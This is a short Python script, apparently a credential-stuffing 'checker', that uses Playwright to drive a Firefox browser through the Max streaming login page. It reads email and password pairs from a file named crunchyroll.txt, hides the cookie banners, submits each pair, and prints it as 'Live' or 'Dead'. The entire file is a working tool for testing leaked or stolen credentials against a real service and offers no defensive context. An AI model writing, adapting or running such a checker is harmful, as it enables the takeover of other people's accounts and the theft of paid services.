import re
from playwright.sync_api import Playwright, sync_playwright, expect
import time
import ConfigStrem as Cf
import os

Usuarios = Cf.GenCorreo(os.path.join(os.getcwd(),'txt','crunchyroll.txt'),True)

while True:
    try:
        Co, Cs = next(Usuarios)
        with sync_playwright() as playwright:
            browser = playwright.firefox.launch(headless=False)
            context = browser.new_context()
            page = context.new_page()  # Create the page here
            page.goto('https://auth.max.com/login?flow=login')

            elements = [
                    "#onetrust-banner-sdk .ot-sdk-column",
                    "#onetrust-banner-sdk .ot-sdk-columns",
                    "#onetrust-pc-sdk .ot-sdk-column",
                    "#onetrust-pc-sdk .ot-sdk-columns",
                    "#ot-sdk-cookie-policy .ot-sdk-column",
                    "#ot-sdk-cookie-policy .ot-sdk-columns"
                ]

            dark_filter = page.wait_for_selector("div.onetrust-pc-dark-filter.ot-fade-in", timeout=60000) 
            page.evaluate("""(el) => el.style.position = 'relative';""", dark_filter)
            
            for element in elements:
                js = f'document.querySelectorAll("{element}").forEach(element => element.style.display = "none");'
                page.evaluate(js)

            page.get_by_test_id("gisdk.gi-login-username.email_field").click()
            page.get_by_test_id("gisdk.gi-login-username.email_field").fill(f"{Co}")

            page.get_by_test_id("gisdk.gi-login-username.password_field").click()
            page.get_by_test_id("gisdk.gi-login-username.password_field").fill(f"{Cs}")

            page.get_by_test_id("gisdk.gi-login-username.signIn_button").click()

            try:
                # https://stackoverflow.com/questions/64303326/using-playwright-for-python-how-do-i-select-or-find-an-element

                time.sleep(8)
                locat = page.query_selector(".notification-message")
                msg = 'That email address or password doesn’t look right.'
                if locat.inner_html() == msg:
                    print(f'[x][Correo:{Co}] [Contrasena:{Cs}] [Estado: Dead]')
                    page.close()

            except Exception:
                print(f'[/][Correo:{Co}] [Contrasena:{Cs}] [Estado: Live]')
                page.close()

    except KeyboardInterrupt:
        break    
    except StopIteration:
        break
